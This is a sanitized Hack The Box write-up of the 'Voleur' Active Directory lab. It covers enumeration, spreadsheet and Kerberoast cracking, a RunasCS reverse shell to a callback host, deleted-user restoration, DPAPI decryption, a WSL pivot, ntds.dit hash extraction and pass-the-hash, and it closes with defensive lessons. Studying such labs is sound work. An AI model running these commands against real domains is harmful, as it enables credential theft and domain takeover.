---
title: "Voleur — Active Directory Credential and Backup Abuse Chain"
description: "Share-hosted documents, Kerberoasting, AD Recycle Bin recovery, and a WSL pivot lead into offline directory-backup analysis."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - kerberos
  - dpapi
  - wsl
  - backup-security
---

## Summary

Voleur is a Hack The Box Windows Active Directory lab. The notes report an attack chain beginning with supplied low-privilege domain access, then moving through share-hosted documents, Kerberoasting, Active Directory Recycle Bin recovery, DPAPI-protected material, a WSL pivot, and offline directory-backup analysis. All target identifiers, account names, credential values, private-key material, hashes, and flags are replaced with role-based placeholders.

## Context and Objective

The notes describe a Windows Active Directory domain controller with Kerberos, LDAP, SMB, WinRM, and an SSH service exposed through WSL. The stated objective was to progress from supplied domain credentials to administrative access in the isolated lab environment. The notes also identify Kerberos time synchronization as an operational prerequisite.

## Approach and Evidence

### 1. Service and Directory Enumeration

**Observation:** The recorded scan findings identify domain services and an SSH service on a non-default port, indicating both a conventional Active Directory surface and a potential WSL pivot surface.

**Action:** The notes report a full TCP service scan followed by LDAP and SMB enumeration using the supplied domain account. They also report synchronizing time before requesting Kerberos tickets.

```bash
nmap -sC -sV -p- <TARGET_IP> -oA <OUTPUT_PREFIX>
ntpdate <TARGET_IP>
nxc ldap <DOMAIN_CONTROLLER> -u '<INITIAL_DOMAIN_USER>' -p '<INITIAL_DOMAIN_PASSWORD>' -k --users
nxc smb <DOMAIN_CONTROLLER> -u '<INITIAL_DOMAIN_USER>' -p '<INITIAL_DOMAIN_PASSWORD>' -k --shares
```

Representative excerpt (truncated):

```text
Domain services: Kerberos, LDAP, SMB, WinRM
SSH on <WSL_SSH_PORT>: WSL pivot surface
Readable share: <IT_SHARE>
```

**Technical significance:** Kerberos, LDAP, and SMB support domain reconnaissance, while a readable operational share may expose credentials or internal process documents. Kerberos authentication depends on sufficiently aligned clocks.

**Result:** The notes report that directory enumeration identified service accounts and a readable IT share.

### 2. Protected Spreadsheet and Service Credentials

**Observation:** The readable share contained an encrypted access-review spreadsheet. The notes report that its recovered contents included credentials for separate service accounts.

**Action:** The notes report downloading the spreadsheet, extracting its password-cracking material, and performing an offline wordlist attack before reviewing the document.

```bash
nxc smb <DOMAIN_CONTROLLER> -u '<INITIAL_DOMAIN_USER>' -p '<INITIAL_DOMAIN_PASSWORD>' -k \
  --share '<IT_SHARE>' --get-file '<REMOTE_SPREADSHEET_PATH>' <LOCAL_SPREADSHEET>
office2john <LOCAL_SPREADSHEET> > <SPREADSHEET_HASH_FILE>
john --wordlist=<WORDLIST> <SPREADSHEET_HASH_FILE>
```

Representative excerpt (sanitized):

```text
Recovered spreadsheet password: <SPREADSHEET_PASSWORD>
<LDAP_SERVICE_ACCOUNT> : <LDAP_SERVICE_PASSWORD>
<IIS_SERVICE_ACCOUNT>  : <IIS_SERVICE_PASSWORD>
```

**Technical significance:** An encrypted business document does not protect embedded credentials when its password is weak. Service-account credentials can materially expand available authentication paths.

**Result:** The notes report recovery of the spreadsheet password and distinct LDAP and IIS service credentials.

### 3. Kerberoasting to WinRM Access

**Observation:** The enumerated domain included an account with a service principal that could be targeted through Kerberos service-ticket requests.

**Action:** The notes report requesting a targeted Kerberoastable ticket, cracking the resulting material offline, then obtaining a ticket for the recovered WinRM account and opening a remote session.

```bash
python3 targetedKerberoast.py -d <DOMAIN> -k --no-pass --dc-host <DOMAIN_CONTROLLER>
hashcat -m 13100 <KERBEROAST_HASH_FILE> <WORDLIST>
impacket-getTGT <DOMAIN>/<WINRM_SERVICE_ACCOUNT>:'<WINRM_SERVICE_PASSWORD>'
evil-winrm -i <DOMAIN_CONTROLLER> -r <DOMAIN>
```

Representative excerpt (sanitized):

```text
<WINRM_SERVICE_ACCOUNT> : <WINRM_SERVICE_PASSWORD>
<WINRM_SERVICE_ACCOUNT>@<DOMAIN> PS>
```

**Technical significance:** Kerberoasting permits offline password recovery attempts against service-ticket material. A cracked account with WinRM authorization provides an authenticated Windows foothold.

**Result:** The notes report a WinRM session as the recovered service account and access to the user-level flag; the flag value is omitted.

### 4. Service-Account Pivot and Deleted-User Recovery

**Observation:** The notes report using a separately recovered LDAP service credential to pivot from the WinRM account. In that context, deleted Active Directory user objects were discoverable, and an access-review document contained credentials for one deleted user.

**Action:** The notes report launching a process under the LDAP service account, enumerating deleted user objects, restoring the relevant object, and using the document-derived credential for the restored account.

```powershell
RunasCS.exe <LDAP_SERVICE_ACCOUNT> <LDAP_SERVICE_PASSWORD> powershell.exe -r <CALLBACK_HOST>:<CALLBACK_PORT>
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
Restore-ADObject -Identity <DELETED_OBJECT_GUID>
```

Representative excerpt (sanitized):

```text
Deleted user object: <RESTORED_DOMAIN_USER>
Restored object: <RESTORED_DOMAIN_USER>
```

**Technical significance:** Restorable directory objects can retain a viable identity after deletion. Privileged access to deleted-object enumeration and restoration expands the post-compromise attack surface.

**Result:** The notes report restoration of a deleted user and use of a distinct document-derived password for that account.

### 5. DPAPI Material and WSL Service Access

**Observation:** The restored user's profile contained DPAPI-protected material. The notes report that offline decryption recovered another domain credential and that the resulting profile exposed SSH private-key material for a WSL service account.

**Action:** The notes report decrypting relevant DPAPI material offline, authenticating as the recovered user, then using the SSH key to access the WSL service.

```bash
impacket-getTGT <DOMAIN>/<DPAPI_RECOVERED_USER>:'<DPAPI_RECOVERED_PASSWORD>'
evil-winrm -i <DOMAIN_CONTROLLER> -r <DOMAIN>
ssh -i <WSL_PRIVATE_KEY> -p <WSL_SSH_PORT> <BACKUP_SERVICE_ACCOUNT>@<DOMAIN_CONTROLLER>
```

Representative excerpt (sanitized):

```text
Recovered credential: <DPAPI_RECOVERED_USER> : <DPAPI_RECOVERED_PASSWORD>
Connected service account: <BACKUP_SERVICE_ACCOUNT>
```

**Technical significance:** DPAPI data can expose credentials when an attacker has required user-context material. WSL can bridge Windows-hosted files and Linux-native access paths.

**Result:** The notes report recovery of a further domain credential and SSH access to the WSL backup service.

### 6. Offline Directory-Backup Analysis

**Observation:** From WSL, the notes report that the Windows drive was mounted and contained Active Directory backup material. The backup set included an offline directory database and SYSTEM hive.

**Action:** The notes report copying the backup material for offline analysis, extracting directory secrets with the paired database and registry hive, then authenticating as the administrative account with recovered hash material.

```bash
scp -r -i <WSL_PRIVATE_KEY> -P <WSL_SSH_PORT> \
  '<BACKUP_SERVICE_ACCOUNT>@<DOMAIN_CONTROLLER>:<WSL_BACKUP_PATH>' <LOCAL_BACKUP_DIRECTORY>
impacket-secretsdump -ntds <NTDS_DATABASE_PATH> -system <SYSTEM_HIVE_PATH> local
impacket-getTGT -hashes :<ADMINISTRATOR_NT_HASH> '<DOMAIN>/<ADMINISTRATOR_ACCOUNT>'
```

Representative excerpt (sanitized):

```text
<ADMINISTRATOR_ACCOUNT>:<RID>:<LM_HASH_PLACEHOLDER>:<ADMINISTRATOR_NT_HASH>:::
```

**Technical significance:** An accessible offline `ntds.dit` file plus its SYSTEM hive enables extraction of domain credential material. Backup access therefore requires protections comparable to direct domain-controller access.

**Result:** The notes report recovery of administrative hash material, an administrative WinRM session, and access to the root-level flag; the hash and flag are omitted.

## Challenges and Decisions

- **Kerberos time alignment:** The notes identify time skew as a potential authentication failure condition and report synchronizing time before Kerberos use.
- **Credential separation:** The notes distinguish credentials recovered from the spreadsheet, Kerberoasting, and DPAPI material; this draft preserves them as separate placeholders and makes no unsupported reuse claim.
- **Backup extraction path:** The notes report reaching the backup set through WSL rather than asserting that normal Windows access controls were bypassed.

## Outcome

The notes report a complete chain from supplied domain access to administrative access: share enumeration, protected-document recovery, Kerberoasting, a service-account pivot, deleted-user restoration, DPAPI decryption, WSL SSH access, and offline directory-backup analysis. The source contains narrative and representative command evidence for these stages, but does not provide independently reproducible proof beyond the recorded lab notes. Flag values, credentials, keys, hashes, host identifiers, and private paths are intentionally omitted.

## Lessons and Recommendations

1. **Protect operational documents and service credentials.** Store secrets outside shared spreadsheets, enforce strong document protection, and limit share access. This recommendation follows the notes' document-based credential recovery.
2. **Use strong, managed service-account credentials.** Kerberoastable accounts with human-chosen passwords are exposed to offline guessing; managed service accounts and long random passwords reduce this risk.
3. **Restrict and audit deleted-object recovery.** Monitor Active Directory Recycle Bin enumeration and restoration, and review which identities can perform those actions.
4. **Treat DPAPI artifacts as sensitive credential material.** Limit profile access, protect recovery material, and investigate unexpected access to user DPAPI data.
5. **Secure WSL and backup boundaries.** Review Windows-drive mounts exposed to WSL service accounts and restrict backup access. Offline Active Directory backups and registry hives require encryption, access controls, and monitoring equivalent to domain-controller data.

## References

- Hack The Box: [Voleur](https://app.hackthebox.com/machines/Voleur) (retired Windows machine)
- Source attribution: authorized Voleur lab notes
- Tools referenced in the notes: `nmap`, `nxc`, `john`, `hashcat`, Impacket, `evil-winrm`, Active Directory PowerShell cmdlets, and `ssh`
